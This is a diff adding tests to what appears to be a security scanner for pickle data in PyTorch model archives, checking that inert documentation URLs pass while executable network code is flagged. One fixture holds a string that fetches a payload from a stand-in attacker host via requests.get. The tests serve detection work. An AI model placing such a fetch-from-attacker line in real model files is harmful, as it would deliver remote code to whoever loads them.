@@ -8032,7 +8032,12 @@ def test_pytorch_zip_allows_inert_pickle_url_literals_without_critical_s310(tmp_
             "docs": "https://docs.ultralytics.com/reference/os.system(command)",
             "api_docs": "https://docs.example.invalid/reference/requests.get(url)",
             "query_docs": "https://docs.example.invalid/path?x=1&handler=requests.get(url)",
+            "semicolon_query_docs": "https://docs.example.invalid/path?x=1;handler=requests.get(url)",
+            "comma_query_docs": "https://docs.example.invalid/path?x=1,handler=httpx.get(url)",
             "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
+            "credentialed_docs": "https://user:pass@docs.example.invalid/reference/requests.get(url)",
+            "encoded_docs": "https://docs.example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
+            "control_docs": "\x00https://docs.example.invalid/reference/httpx.get(url)\x1f",
             "repository": "https://github.com/ultralytics/ultralytics",
         },
         protocol=0,
@@ -8061,6 +8066,52 @@ def test_pytorch_zip_keeps_code_after_url_literal_actionable(tmp_path: Path) -> 
     assert any(
         issue.severity == IssueSeverity.CRITICAL
         and (issue.details.get("associated_global") == "os.system" or "os.system" in issue.message)
+        for issue in result.issues
+    )
+
+
+def test_pytorch_zip_allows_inert_url_literal_in_concatenated_pickle_stream(
+    tmp_path: Path,
+) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "concatenated-url-metadata.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+    payload += b"\x00\x00"
+    payload += pickle.dumps(
+        {"metadata_url": "https://docs.example.invalid/path?x=1;handler=requests.get(url)"},
+        protocol=4,
+    )
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert not any(
+        issue.rule_code in {"S302", "S310"} and issue.severity == IssueSeverity.CRITICAL for issue in result.issues
+    )
+
+
+def test_pytorch_zip_keeps_executable_network_literal_in_concatenated_pickle_stream(
+    tmp_path: Path,
+) -> None:
+    model_path = create_mock_pytorch_zip(
+        tmp_path / "concatenated-network-loader.pt", with_pickle=False, prefix="archive"
+    )
+    payload = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
+    payload += b"\x00\x00"
+    payload += pickle.dumps(
+        {"loader": "requests.get('https://attacker.example/payload')"},
+        protocol=4,
+    )
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S302"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "network_function"
+        and issue.details.get("function") == "requests.get"
         for issue in result.issues
     )
 
